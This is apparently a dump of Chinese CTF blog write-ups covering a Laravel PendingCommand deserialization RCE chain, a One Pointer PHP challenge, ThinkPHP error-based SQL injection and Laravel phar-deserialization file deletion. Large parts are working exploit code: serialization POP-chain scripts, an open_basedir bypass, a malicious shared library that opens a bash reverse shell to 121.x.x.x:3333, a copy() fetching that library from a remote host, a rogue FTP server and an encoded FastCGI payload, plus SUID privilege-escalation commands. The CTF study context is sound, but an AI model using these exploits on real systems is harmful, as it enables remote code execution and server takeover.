PendingCommand.php中run函数用来执行命令，而destruct中又调用了run函数。所以简单的 POP 链为：构造的 exp 经过反序列化后调用 __destruct()，进而调用 run(),run() 进行代码执行。 现在通过exp来动态调试对利用链进行分析:在执行unserialize后需要加载类，这里是通过src\\Illuminate\\Foundation\\AliasLoader.php中load方法进行类的加载： 桥豆麻袋，在这一步之前需要会用phpStorm进行动态调试，教程在上面。 跟进unserialize： static::$facadeNamespace是一个字符串常量：Facades\\来看下这是个什么东西：Facades（读音：/fəˈsäd/ ）为应用程序的服务容器中可用的类提供了一个「静态」接口。Laravel 自带了很多 facades ，几乎可以用来访问到 Laravel 中所有的服务。Laravel facades 实际上是服务容器中那些底层类的「静态代理」，相比于传统的静态方法， facades 在提供了简洁且丰富的语法同时，还带来了更好的可测试性和扩展性。Laravel 框架门面 Facade 源码分析：https://learnku.com/articles/4684/analysis-of-facade-source-code-of-laravel-frame 概括一下：门面相对于其他方法来说，最大的特点就是简洁。 因此总结一下，此时加载ArrayInput类和Mockery类就会进行如下操作： 1.需要加载的类是否为facede门面类，如果是则调用$this-&gt;loadFacade2.Illuminate\\Support\\Facades命名空间来查找是否属于这些alias alias是类的别名，class_alias函数可以为任何类创建别名，而在Laravel启动后为各个门面类调用了class_alias函数，因此不必直接用类名，在config文件夹的app文件里面存放着门面与类名的映射.Mockery类并非门面类，因此进入后面的if后通过loadClass方法调用findfile()函数通过classMap中定义的命名空间和对应类的地址的映射来获得所要加载类对应的类文件地址，找到类地址后通过includeFile来将该类进行包含： 到这Laravel加载类的方式应该也比较清楚了，到此完成了对整个利用类，也就是PendingCommand类的加载已经完成。 下面进入该类的析构方法： 这里hasExecuted默认为false，图片太长了没截到。然后进入$this-&gt;run方法： 使用Mockery::mock实现对象的模拟： 这里涉及到类的加载，因此再次会调用load方法来加载类,回到load那里重复一遍，这里就直接跳过了。接着会调用$this-&gt;createABufferedOutputMock()方法，我们跟进该方法： 很明显如果这里expectedOutput不是数组的话就会立刻报错，利用链无法继续。所以全局找一下这个属性看看有没有可控的地方： 发现只有测试类有该属性。而测试类一般不会加载，那有何办法能够凭空创造expectedOutput属性呢？ 魔术方法。当类的成员属性被设定为private甚至是没有该成员属性时如果我们去获取这个不存在或者是私有属性，则会触发该类的__get()魔术方法。 能搜出来一堆，这里和网上文章一样选择//vendor\\laravel\\framework\\src\\Illuminate\\Auth\\GenericUser.php这里的。 class GenericUser implements UserContract { public function __construct(array $attributes) { $this-&gt;attributes = $attributes; } public function __get($key) { return $this-&gt;attributes[$key]; } } 只需要使得$this-&gt;test为GenericUser类，并且让attributes中存在键名为expectedOutput的数组，这样便可以跳出循环，使得利用链能够继续。回到mockConsoleOutput(): 这里还有一个需要数组的地方，方法同上。 接下来就到了利用链的关键处： try { $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); } catch (NoMatchingExpectationException $e) { if ($e-&gt;getMethodName() === &#39;askQuestion&#39;) { $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;); } throw $e; } 来看后面的调用栈：这里我没断到后面的调用栈，不知道是什么原因，偷图： ————后记：这里可能是要边调边显示的，调到后面就出来了。 Kernel::class是一个定量，其值为Illuminate\\Contracts\\Console\\Kernel这个类，我们持续跟进后几个调用栈： 在进入make()方法,因为只有一个$key参数，所以第二个参数是空值 再调用父类的make方法，此时parameters为空： 跟进下面这个resolve方法： /** * Resolve the given type from the container. * * @param string $abstract * @param array $parameters * @return mixed */ protected function resolve($abstract, $parameters = []) { $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null( $this-&gt;getContextualConcrete($abstract) ); // If an instance of the type is currently being managed as a singleton we&#39;ll // just return an existing instance instead of instantiating new instances // so the developer can keep using the same objects instance every time. if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) { return $this-&gt;instances[$abstract]; } $this-&gt;with[] = $parameters; $concrete = $this-&gt;getConcrete($abstract); // We&#39;re ready to instantiate an instance of the concrete type registered for // the binding. This will instantiate the types, as well as resolve any of // its &quot;nested&quot; dependencies recursively until all have gotten resolved. if ($this-&gt;isBuildable($concrete, $abstract)) { $object = $this-&gt;build($concrete); } else { $object = $this-&gt;make($concrete); } // If we defined any extenders for this type, we&#39;ll need to spin through them // and apply them to the object being built. This allows for the extension // of services, such as changing configuration or decorating the object. foreach ($this-&gt;getExtenders($abstract) as $extender) { $object = $extender($object, $this); } // If the requested type is registered as a singleton we&#39;ll want to cache off // the instances in &quot;memory&quot; so we can return it later without creating an // entirely new instance of an object on each subsequent request for it. if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) { $this-&gt;instances[$abstract] = $object; } $this-&gt;fireResolvingCallbacks($abstract, $object); // Before returning, we will also set the resolved flag to &quot;true&quot; and pop off // the parameter overrides for this build. After those two things are done // we will be ready to return back the fully constructed class instance. $this-&gt;resolved[$abstract] = true; array_pop($this-&gt;with); return $object; } 第一种思路： 我们看到resolve方法中: // namespace Illuminate\\Container if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) { return $this-&gt;instances[$abstract]; } 如果我们可以控制$this-&gt;instances，那么我们将有可能返回一个任意对象，最终该对象会赋值给$this-&gt;app[Kernel::class]，在这里选取的是\\Illuminate\\Foundation\\Application，该类同样继承自Containers,因此同样会进入该方法，此时$this就是Application这个实例，而我们想要返回的同样也是该类，因此我们需要做的是 Application-&gt;instances[‘Illuminate\\Contracts\\Console\\Kernel’] = Application 至于为何选取Application在之后分析过程中也就明了了： 分析到这我们可以先构造部分EXP: &lt;?php namespace Illuminate\\Foundation\\Testing{ //执行函数所在处 use PHPUnit\\Framework\\TestCase as PHPUnitTestCase; class PendingCommand{ protected $app; protected $command; protected $parameters; public $test; public function __construct($test, $app, $command, $parameters) { $this-&gt;app = $app; $this-&gt;test = $test; $this-&gt;command = $command; $this-&gt;parameters = $parameters; } } } namespace Illuminate\\Auth{ //此处和下面一样都是触发get的，二选一即可 class GenericUser{ protected $attributes; public function __construct(array $attributes) { $this-&gt;attributes = $attributes; } public function __get($key) { return $this-&gt;attributes[$key]; } } } //__get方法也同样可以使用如下类 namespace Faker{ class DefaultGenerator{ protected $default; public function __construct($default = null) { $this-&gt;default = $default; } public function __get($attribute) { return $this-&gt;default; } } } namespace Illuminate\\Foundation{ class Application{ protected $instances = []; public function __construct($instances = []) { $this-&gt;instances[&#39;Illuminate\\Contracts\\Console\\Kernel&#39;] = $instances; } } } namespace { $genericuser = new Illuminate\\Auth\\GenericUser( array( //这里需要两次使用来循环获得以便成功跳过方法,两次键名分别为expectedOutput和expectedQuestions &quot;expectedOutput&quot;=&gt;array(&quot;crispr&quot;=&gt;&quot;0&quot;), &quot;expectedQuestions&quot;=&gt;array(&quot;crispr&quot;=&gt;&quot;1&quot;) ) ); $app = new Illuminate\\Foundation\\Application(); //通过如下步骤最终获得的$this-&gt;app[Kernel::class]就是该Application实例 $application = new Illuminate\\Foundation\\Application($app); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand( $genericuser, $application, &quot;system&quot;, array(&quot;whoami&quot;) ); echo urlencode(serialize($pendingcommand)); } 选择application类的理由：此时的$this和instances均为application类，此时赋值给$this-&gt;app[Kernel::class]，在继续调用call方法时，由于application类没有call方法，根据特性会寻找其父类也就是Container类的call方法: 此时$callback为system而$parameters为whoami，继续跟进：、 public static function call($container, $callback, array $parameters = [], $defaultMethod = null) { if (static::isCallableWithAtSign($callback) || $defaultMethod) { return static::callClass($container, $callback, $parameters, $defaultMethod); } return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) { return call_user_func_array( $callback, static::getMethodDependencies($container, $callback, $parameters) ); }); } 此时$callback = system,判断是否进入isCallableWithAtSign: 显然无法满足，进入第二个分支： 可以看到getMethodDependencies方法只是将一个空数组和$parameters进行合并，合并后的数据依然是可控的，最终通过call_user_func_array(‘system’,array(‘whoami’))执行命令，这也是$parameters为数组的原因，因为call_user_func_array第二个参数要求是数组形式。 第二种思路： 没有进入该if语句，继续往下运行会进入getConcrete()方法，而其中的关键方法就是getConcrete()，我们在继续跟进: 看了后面思路与方法一大致相同 就不写了。 复现思路：https://www.anquanke.com/post/id/230005总结：虽然还是不能完全看懂，但是对Laravel框架和此反序列化rce的执行流程有了基本的了解，以后熟练了必须再回来自己理一遍。 Laravel5.4 反序列化漏洞挖掘 2021/5/10麻了，写了一堆忘记保存直接关机了。。罢了 反正没人看 留个记录吧。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[蓝帽杯 2021]One Pointer PHP","slug":"蓝帽杯-2021-One-Pointer-PHP","date":"2021-05-06T06:46:02.000Z","updated":"2021-05-06T06:55:14.029Z","comments":true,"path":"2021/05/06/蓝帽杯-2021-One-Pointer-PHP/","link":"","permalink":"/2021/05/06/蓝帽杯-2021-One-Pointer-PHP/","excerpt":"","text":"这题没做出来需要反思给了源码 第一层user.php &lt;?php class User{ public $count; } ?&gt; add_api.php &lt;?php include &quot;user.php&quot;; if($user=unserialize($_COOKIE[&quot;data&quot;])){ $count[++$user-&gt;count]=1; if($count[]=1){ $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); }else{ eval($_GET[&quot;backdoor&quot;]); } }else{ $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user)); } ?&gt; 另$a-&gt;count等于php long long类型最大值-1即可绕过(转化为float报错)本地测试如下： 没过： 过了： 过了之后就可以执行命令，查看phpinfo： ban了一大堆函数，print_r(scandir(./))看下目录： 查看根目录失败，看到openbase_dir有限制，想起来[NCTF2019]phar matches everything里中bypass open_basedir的姿势：https://xz.aliyun.com/t/4720 &lt;?php mkdir(&#39;troy3e&#39;); chdir(&#39;troy3e&#39;); ini_set(&#39;open_basedir&#39;,&#39;..&#39;); chdir(&#39;..&#39;);chdir(&#39;..&#39;); chdir(&#39;..&#39;);chdir(&#39;..&#39;); chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;); ini_set(&#39;open_basedir&#39;,&#39;/&#39;); var_dump(file_get_contents(&quot;/usr/local/etc/php/php.ini&quot;)); ?&gt; 没法读flag，估计是权限不够，但是可以读php.ini。预期解是pwn这个： 然后就不会了。。。不过现在想想还是大意了，因为这非预期前阵子刚学习过，还就是上面NCTF那道题里面的。。。此处不得不佩服ha1师傅：https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/ 回到phpinfo 查看nginx配置文件：readfile(‘/etc/nginx/sites-enabled/default’); 发现fpm开在9001端口。 FTP - SSRF 攻击 FPM/FastCGI如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。如果我们传入?file=ftp://evil-server/file.txt&amp;data=payload，会发生以下情况： 首先通过 file_put_contents() 函数连接到我们的FTP服务器，并试图使用 file_put_contents() 把文件上传上去。但是我们搭建的恶意的ftp服务器将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。 这里通过加载恶意so的方式来RCE。 写一个扩展： #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; __attribute__ ((__constructor__)) void preload (void){ system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/121.x.x.x/3333 0&gt;&amp;1&#39;&quot;); } 编译： gcc hpdoger.c -fPIC -shared -o hpdoger.so 将生成的 hpdoger.so 上传到目标主机的 /tmp 目录中，之前复现就卡在这一步，直接用的copy属实是hanpi了(参考http://www.hackdig.com/05/hack-342091.htm)： /add_api.php?backdoor=mkdir(&#39;troy3e&#39;);chdir(&#39;troy3e&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);copy(&#39;http://121.196.169.53:5554/hpdoger.so) 然后再自己vps上使用以下脚本搭建一个恶意的ftp服务器： import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#39;0.0.0.0&#39;, 2000)) s.listen(1) conn, addr = s.accept() conn.send(b&#39;220 welcome\\n&#39;) #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b&#39;331 Please specify the password.\\n&#39;) #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b&#39;230 Login successful.\\n&#39;) #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b&#39;200 Switching to Binary mode.\\n&#39;) #Size / conn.send(b&#39;550 Could not get the file size.\\n&#39;) #EPSV (1) conn.send(b&#39;150 ok\\n&#39;) #PASV conn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n&#39;) #STOR / (2) conn.send(b&#39;150 Permission denied.\\n&#39;) #QUIT conn.send(b&#39;221 Goodbye.\\n&#39;) conn.close() 同时监听3333端口。生成攻击 php-fpm 所需要的脚本： 见http://www.hackdig.com/05/hack-342091.htm太长了就不放了 payload： 567bb380-8360-4aeb-b93c-cddea7970584.node3.buuoj.cn/add_api.php?backdoor=$file = $_GET[&#39;file&#39;];$data = $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file=ftp://121.x.x.x:2000&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 但此时权限还是不够，无法读取flag： SUID 提权UID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。 已知的可用来提权的linux可行性的文件列表如下： nmap vim find bash more less nano cp 以下命令可以发现系统上运行的所有SUID可执行文件。 #以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试 find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000-print2&gt;/dev/null find / -user root -perm -4000-exec ls -ldb {} \\; 在本题php就有suid，直接进入交互模式执行代码，得到flag： chdir(&#39;troy3e&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;); 参考链接：https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/https://www.anquanke.com/post/id/186186http://www.hackdig.com/05/hack-342091.htm","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[红明谷CTF 2021]EasyTP","slug":"红明谷CTF-2021-EasyTP","date":"2021-04-27T03:50:38.000Z","updated":"2021-04-27T07:51:04.068Z","comments":true,"path":"2021/04/27/红明谷CTF-2021-EasyTP/","link":"","permalink":"/2021/04/27/红明谷CTF-2021-EasyTP/","excerpt":"","text":"BUU上有点问题的题目还是写一篇博客吧，网上找了找都没人写。tp3这个链的分析在我的另一篇博客里，不过更推荐看这个：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt了解原理之后开始做题。 开启恶意MySQL服务器，设置读取文件为/start.sh FLAG_PATH=/var/www/html/tp3.sql FLAG_MODE=M_SQL if [ ${ICQ_FLAG} ];then case $FLAG_MODE in &quot;M_ECHO&quot;) echo -n ${ICQ_FLAG} &gt; ${FLAG_PATH} FILE_MODE=755 chmod ${FILE_MODE} ${FLAG_PATH} ;; &quot;M_SED&quot;) #sed -i &quot;s/flag{x*}/${ICQ_FLAG}/&quot; ${FLAG_PATH} sed -i -r &quot;s/flag\\\\{.*\\\\}/ ${ICQ_FLAG}/&quot; ${FLAG_PATH} ;; &quot;M_SQL&quot;) sed -i -r &quot;s/flag\\\\{.*\\\\}/${ICQ_FLAG}/&quot; ${FLAG_PATH} mysql -uroot -proot &lt; ${FLAG_PATH} rm -f ${FLAG_PATH} ;; *) ;; esac echo [+] ICQ_FLAG OK\\n unset ICQ_FLAG\\nelse\\n echo [!] no ICQ_FLAG\\nfi\\n 很乱，懒得整理了。总之flag在数据库里，用户名密码为root root。用户名密码为root root。用户名密码为root root。这里buu应该是将比赛时错误的环境修复过来了。（比赛时是123456 报错注入： updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,64),0x7e),1) //在这一步查出库是test后将poc开头那里database改为test updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;test&#39;),1,32),0x7e),1) updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;f1ag&#39;),1,32),0x7e),1) //这一步无法执行，后面就知道原因了。 我在最后一步读取flag的时候一直是白屏，注了好久还是白屏，实在想不明白原因。只能换getshell了，写个一句话，蚁剑连上发现没法操作数据库，换冰蝎，传个冰蝎马连上去：mysql://root:root@127.0.0.1:3306/mysql然而这里直接查看flag也是看不到的，必须要导出来才能查看。 注了一晚上结果是不能注。。。绝了","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[护网杯 2018]easy_laravel","slug":"护网杯-2018-easy-laravel","date":"2021-04-20T13:24:26.000Z","updated":"2021-04-20T17:13:22.632Z","comments":true,"path":"2021/04/20/护网杯-2018-easy-laravel/","link":"","permalink":"/2021/04/20/护网杯-2018-easy-laravel/","excerpt":"","text":"题目注释里的链接已经挂了，BUU直接给了源码，拉下来composer install生成vendor目录。（没换源的话可能会连接超时） Artisan是Laravel自带的命令接口。php artisan list可以查看php artisan 命令列表： 命令 说明 备注 php artisan make:resource ? 创建api返回格式化资源 &gt;=5.4版本可用 php artisan make:rule ? 创建validate规则 &gt;=5.4版本可用 php artisan make:exception ? 创建异常类 &gt;=5.4版本可用 php artisan make:factory ? 创建工厂类 &gt;=5.4版本可用 php artisan package:discover 重置包的缓存信息 &gt;=5.4版本可用 php artisan storage:link ？ Create a symbolic link from &quot;public/storage&quot; to &quot;storage/app/public&quot; &gt;=5.4版本可用 php artisan view:clear 清楚所有已编译的视图文件 &gt;=5.4版本可用 php artisan clear-compiled 清除编译后的类文件 php artisan down 使应用程序进入维修模式 php artisan up 退出应用程序的维护模式 php artisan env 显示当前框架环境 php artisan fresh 清除包含框架外的支架 php artisan help 显示命令行的帮助 php artisan list 列出命令 php artisan migrate 运行数据库迁移 php artisan env 显示当前框架环境 php artisan optimize 为了更好的框架去优化性能 php artisan serve 在php开发服务器中服务这个应用 --port 8080，--host 0.0.0.0 php artisan tinker 在应用中交互 php artisan app:name ? 设置应用程序命名空间 php artisan auth:clear-resets 清除过期的密码重置密钥 未使用过 php artisan cache:clear 清除应用程序缓存 php artisan cache:table 创建一个缓存数据库表的迁移 php artisan config:cache 创建一个加载配置的缓存文件 php artisan config:clear 删除配置的缓存文件 php artisan db:seed 数据库生成模拟数据 php artisan event:generate 生成event和listen 需要实现配置eventserviceprivoder php artisan make:command ? 创建一个新的命令处理程序类 php artisan make:console ? 生成一个Artisan命令 php artisan key:generate 设置程序密钥 php artisan make:controller ? 生成一个资源控制类 php artisan make:middleware ? 生成一个中间件 php artisan make:migration ? 生成一个迁移文件 php artisan make:model ? 生成一个Eloquent 模型类 php artisan make:provider ? 生成一个服务提供商的类 php artisan make:request ? 生成一个表单消息类 php artisan migrate:install ? 创建一个迁移库文件 php artisan make:migration ? 生成一个迁移文件 php artisan migrate:refresh ? 复位并重新运行所有的迁移 php artisan migrate:reset ? 回滚全部数据库迁移 php artisan migrate:rollback ? 回滚最后一个数据库迁移 php artisan migrate:status 显示列表的迁移 php artisan queue:failed 列出全部失败的队列工作 php artisan queue:failed-table ? 创建一个迁移的失败的队列数据库工作表 php artisan queue:flush 清除全部失败的队列工作 php artisan queue:forget ? 删除一个失败的队列工作 php artisan queue:listen ? 监听一个确定的队列工作 php artisan queue:restart 重启现在正在运行的所有队列工作 php artisan queue:retry 重试一个失败的队列工作 php artisan queue:subscribe 订阅URL,放到队列上 php artisan queue:table 创建一个迁移的队列数据库工作表 php artisan queue:work 进行下一个队列任务 php artisan route:cache 为了更快的路由登记，创建一个路由缓存文件 php artisan route:clear 清除路由缓存文件 php artisan route:list 列出全部的注册路由 php artisan schedule:run 运行预定命令 php artisan session:table 创建一个迁移的SESSION数据库工作表 php artisan vendor:publish 发表一些可以发布的有用的资源来自提供商的插件包 baum包命令 命令 说明 备注 php artisan baum Get Baum version notice. php artisan baum:install ? Scaffolds a new migration and model suitable for Baum 使用php artisan route:list查看一下已经定义的路由： 或者也可以直接在routers/web.php里查看： 具体的路由可以在 Illuminate/Routing/Router.php 中找到 可以看到基本所有操作都需要登录，先看UploadController 和 FlagController，两个都使用了一个叫做 admin 的中间件。在 app/Http/Middleware/AdminMiddleware.php 中可以看到代码： 看到了管理员的邮箱，尝试新注册一个覆盖： 显示已经注册。不行，那就想办法获取管理员的账号密码。NoteController这里似乎有个sql注入： 这里我试了一会儿都是直接报错，没办法注入，可能是环境的变化？ ————————后记：列数错了，没仔细看。。。 事实上这里也无法注出管理员密码，在database/factories/ModelFactory.php里，告诉了我们这里就算注出来密码也是加过密的。 但是在laravel5.4中，重置密码的操作很有意思 Illuminate\\Auth\\Passwords\\PasswordBroker.php首先是发送重置链接的方法 如果用户存在的话，会有个token，这里跟进一下create。什么？这是notepad？那没事了，phpStorm启动！ 这里直接把新生成的token写入了数据库中。总结一下：向管理员邮箱发送重置密码的请求，同时生成一个token存入数据库。随便注册一个账号，然后注出更改密码的token，最后实现直接更改管理员的密码。发送重置请求： 返回500是成功发送。注册个新号注出token：42e06b61aa3a3206902b46785c9744e1bb0e07de494bfe74b65ee8f7217377af Troy3e&#39; union select 1,token,3,4,5 from password_resets order by created_at desc limit 1-- - 记得按时间排序： 重置管理员密码： 成功进入： 照理说访问flag应该出flag，但是没有： 这里需要学习一下blade：Blade 是由 Laravel 提供的非常简单但功能强大的模板引擎，不同于其他流行的 PHP 模板引擎，Blade 在视图中并不约束你使用 PHP 原生代码。所有的 Blade 视图最终都会被编译成原生 PHP 代码并缓存起来直到被修改，这意味着对应用的性能而言 Blade 基本上是零开销。Blade 视图文件使用 .blade.php 文件扩展并存放在 resources/views 目录下。这是因为模板编译后的文件没有删除而导致无法显示flag，因此需要删除编译后的模板文件，所以需要知道编译后的文件名（Illuminate\\View\\Compilers\\Compiler.php）： 编译后文件的路径由两部分构成第一部分是模板的绝对路径path，第二部分是是缓存路径，又因为缓存路径为/storage/framework/views/，其中/usr/share/nginx/html/是nginx的默认web路径，由提示的得到，path为/usr/share/nginx/html/resources/views/auth/flag.blade.php的sha1值 即可以得到编译后的文件的路径： /usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php 那么接下来要做的就是删掉这个文件。看到旁边还有个上传功能： 上传成功则传到app/public，并且下面check函数存在file_exists函数，可以触发phar反序列化。然后寻找删除文件的地方，全局搜索__destruct： swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php 正是我们要寻找的删除函数。 exp: &lt;?php include(&#39;autoload.php&#39;); $a = serialize(new Swift_ByteStream_TemporaryFileByteStream()); var_dump(unserialize($a)); var_dump($a); $a = preg_replace(&#39;/\\/tmp\\/FileByteStream[\\w]{6}/&#39;, &quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $a); //将其换成要删除的文件名 $a = str_replace(&#39;s:25&#39;, &#39;s:90&#39;, $a); //修改对应的序列化数据长度 var_dump($a); $b = unserialize($a); $p = new Phar(&#39;./tr1ple.phar&#39;, 0); $p-&gt;startBuffering(); $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;); $p-&gt;setMetadata($b); $p-&gt;addFromString(&#39;test.txt&#39;,&#39;text&#39;); $p-&gt;stopBuffering(); rename(&#39;tr1ple.phar&#39;, &#39;tr1ple.gif&#39;) ?&gt; 但是这个在BUU上是打不通的，我仔细对比了buu给的exp和网上复现wp的区别，发现是缓存文件地址的不同，所以用网上的那个是没法成功删掉缓存文件的。exp就不放了，BUU贴出来了，链接在下面。 想了想可能是这个导致的： 不去深究了，理解就行。 复现思路：https://www.cnblogs.com/tr1ple/p/11044313.htmlhttps://github.com/CTFTraining/huwangbei_2018_easy_laravel/blob/master/exp/easy_laravel_exp.pyhttps://www.codercto.com/a/31804.html","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[NCTF2019]phar matches everything","slug":"NCTF2019-phar-matches-everything","date":"2021-04-09T12:42:42.000Z","updated":"2021-04-09T14:30:08.377Z","comments":true,"path":"2021/04/09/NCTF2019-phar-matches-everything/","link":"","permalink":"/2021/04/09/NCTF2019-phar-matches-everything/","excerpt":"","text":"关键词：phar反序列化；ssrf打php-fpm WP本来不想发的，但是这道题BUU的环境有一些小变动。希望能帮到一些卡住的人。并且这道题也有很多值得学习的地方。 github把源码down下来： catchmine.php &lt;?php class Easytest{ protected $test; public function funny_get(){ return $this-&gt;test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]); if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){ echo $this-&gt;curl($this-&gt;url); } } } if(isset($_POST[&quot;submit&quot;])) { $check = getimagesize($_POST[&#39;name&#39;]); if($check !== false) { echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; } else { echo &quot;File is not an image.&quot;; } } ?&gt; upload.php &lt;?php $target_dir = &quot;uploads/&quot;; $uploadOk = 1; $imageFileType=substr($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],strrpos($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],&#39;.&#39;)+1,strlen($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;])); $file_name = md5(time()); $file_name =substr($file_name, 0, 10).&quot;.&quot;.$imageFileType; $target_file=$target_dir.$file_name; $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]); if($check !== false) { echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; $uploadOk = 1; } else { echo &quot;File is not an image.&quot;; $uploadOk = 0; } if (file_exists($target_file)) { echo &quot;Sorry, file already exists.&quot;; $uploadOk = 0; } if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; 500000) { echo &quot;Sorry, your file is too large.&quot;; $uploadOk = 0; } if($imageFileType !== &quot;jpg&quot; &amp;&amp; $imageFileType !== &quot;png&quot; &amp;&amp; $imageFileType !== &quot;gif&quot; &amp;&amp; $imageFileType !== &quot;jpeg&quot; ) { echo &quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;; $uploadOk = 0; } if ($uploadOk == 0) { echo &quot;Sorry, your file was not uploaded.&quot;; } else { if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) { echo &quot;The file $file_name has been uploaded to ./uploads/&quot;; } else { echo &quot;Sorry, there was an error uploading your file.&quot;; } } ?&gt; catchmine.php里面有一个反序列化，先看这里。Main::curl()明显存在SSRF并且可使用文件流造成任意文件读取。但是要触发curl的话就没法控制main里面的url了，所以还需要上传个phar文件，在getimagesize处触发。思路：第一次反序列化，在getimagesize处触发phar反序列化，从而控制url。第二次反序列化，执行curl。 exp：（比较简单就不自己写了，来自guoke师傅 &lt;?php class Easytest{ protected $test=&#39;1&#39;; } class Main{ public $url=&#39;file:///proc/net/arp&#39;; } $a=new Easytest(); echo urlencode(serialize($a)); $b=new Main(); @unlink(&quot;phar.phar&quot;); $phar=new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;GIF89a&#39;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 